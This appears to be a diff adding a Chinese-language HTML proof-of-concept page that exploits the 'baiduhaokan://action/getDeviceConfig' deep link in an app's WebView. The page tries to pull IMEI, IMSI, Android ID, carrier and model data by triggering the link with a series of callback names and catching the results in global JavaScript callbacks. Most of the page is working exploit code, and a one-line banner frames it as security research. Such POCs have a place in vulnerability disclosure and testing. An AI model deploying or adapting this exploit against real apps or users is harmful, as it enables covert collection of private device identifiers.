@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>设备信息窃取 - 完整版 POC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 20px; 
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #eee;
+            min-height: 100vh;
+        }
+        h1 { color: #00ff88; text-align: center; margin-bottom: 30px; }
+        .card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .step {
+            background: #0f3460;
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .step-num {
+            background: #00ff88;
+            color: #000;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        button {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+        button:hover { transform: scale(1.05); }
+        button:active { transform: scale(0.95); }
+        .result {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .warning {
+            background: #ff6b6b;
+            color: #000;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔓 getDeviceConfig 设备信息窃取 POC</h1>
+    
+    <div class="warning">
+        ⚠️ 安全研究 POC - 仅供安全测试使用
+    </div>
+    
+    <div class="card">
+        <h3>📋 漏洞说明</h3>
+        <p>该 DeepLink 可以获取以下敏感信息：</p>
+        <ul>
+            <li><strong>imei</strong> - 设备 IMEI（隐私敏感）</li>
+            <li><strong>android_id</strong> - Android 设备 ID</li>
+            <li><strong>imsi</strong> - SIM 卡 IMSI（隐私敏感）</li>
+            <li><strong>model</strong> - 设备型号</li>
+            <li><strong>brand</strong> - 设备品牌</li>
+            <li><strong>network</strong> - 网络类型</li>
+            <li><strong>carrier</strong> - 运营商信息</li>
+        </ul>
+    </div>
+    
+    <div class="card">
+        <h3>🎯 测试步骤</h3>
+        
+        <div class="step">
+            <span class="step-num">1</span>
+            在应用内的 WebView 中打开此页面
+        </div>
+        
+        <div class="step">
+            <span class="step-num">2</span>
+            点击下方按钮触发 DeepLink
+        </div>
+        
+        <div class="step">
+            <span class="step-num">3</span>
+            观察是否获取到设备信息
+        </div>
+    </div>
+    
+    <div class="card">
+        <h3>🚀 执行 POC</h3>
+        <button onclick="triggerDeepLink()">🔓 触发 getDeviceConfig</button>
+        <button onclick="testMultipleCallbacks()">🔄 多参数测试</button>
+        <button onclick="clearLog()">🗑️ 清空日志</button>
+    </div>
+    
+    <div class="card">
+        <h3>📝 执行日志</h3>
+        <div id="log" class="result">等待执行...</div>
+    </div>
+    
+    <script>
+    var logDiv = document.getElementById('log');
+    var logs = [];
+    
+    function log(msg, type = 'info') {
+        var timestamp = new Date().toLocaleTimeString();
+        var logEntry = '[' + timestamp + '] ' + msg;
+        logs.push(logEntry);
+        logDiv.innerText = logs.join('\n\n');
+        console.log(logEntry);
+        
+        // 同时显示 alert
+        // alert(msg);
+    }
+    
+    function clearLog() {
+        logs = [];
+        logDiv.innerText = '等待执行...';
+    }
+    
+    function triggerDeepLink() {
+        log('=== 开始触发 getDeviceConfig ===');
+        
+        // 核心 POC：使用 callback 尝试获取数据
+        var callbackNames = [
+            'deviceInfoCallback',
+            'getDeviceConfigData', 
+            'configCallback',
+            'cb',
+            'data',
+            'result'
+        ];
+        
+        for (var i = 0; i < callbackNames.length; i++) {
+            var dl = 'baiduhaokan://action/getDeviceConfig?callback=' + callbackNames[i];
+            log('尝试 DeepLink #' + (i+1) + ': ' + dl);
+            (function(cb) {
+                setTimeout(function() {
+                    window.location = cb;
+                }, i * 500);
+            })(dl);
+        }
+        
+        log('✅ 所有 DeepLink 已触发');
+        log('请检查手机是否弹出权限请求（IMEI/IMSI 读取）');
+    }
+    
+    function testMultipleCallbacks() {
+        log('=== 测试不同 callback 格式 ===');
+        
+        var testCases = [
+            // 正常函数名
+            { url: 'baiduhaokan://action/getDeviceConfig?callback=cb', desc: '简单回调' },
+            // 数字回调
+            { url: 'baiduhaokan://action/getDeviceConfig?callback=123', desc: '数字回调' },
+            // URL 编码
+            { url: 'baiduhaokan://action/getDeviceConfig?callback=' + encodeURIComponent('{"imei":"test"}'), desc: 'JSON 回调' },
+        ];
+        
+        testCases.forEach(function(tc, i) {
+            log('测试 ' + (i+1) + ': ' + tc.desc);
+            setTimeout(function() {
+                window.location = tc.url;
+            }, i * 1000);
+        });
+    }
+    
+    // 尝试定义可能被调用的全局回调函数
+    window.deviceInfoCallback = function(data) {
+        log('🎉 回调被触发! 数据: ' + JSON.stringify(data));
+        alert('数据泄露成功!\n\n' + JSON.stringify(data, null, 2));
+    };
+    
+    window.getDeviceConfigData = function(data) {
+        log('🎉 getDeviceConfigData 回调: ' + JSON.stringify(data));
+    };
+    
+    window.cb = function(data) {
+        log('🎉 cb 回调: ' + JSON.stringify(data));
+    };
+    
+    window.configCallback = function(data) {
+        log('🎉 configCallback 回调: ' + JSON.stringify(data));
+    };
+    
+    window.data = function(data) {
+        log('🎉 data 回调: ' + JSON.stringify(data));
+    };
+    
+    window.result = function(data) {
+        log('🎉 result 回调: ' + JSON.stringify(data));
+    };
+    
+    log('POC 已就绪');
+    log('注意: 此 POC 需要在好看看 APP 的 WebView 中打开才能触发');
+    </script>
+</body>
+</html>
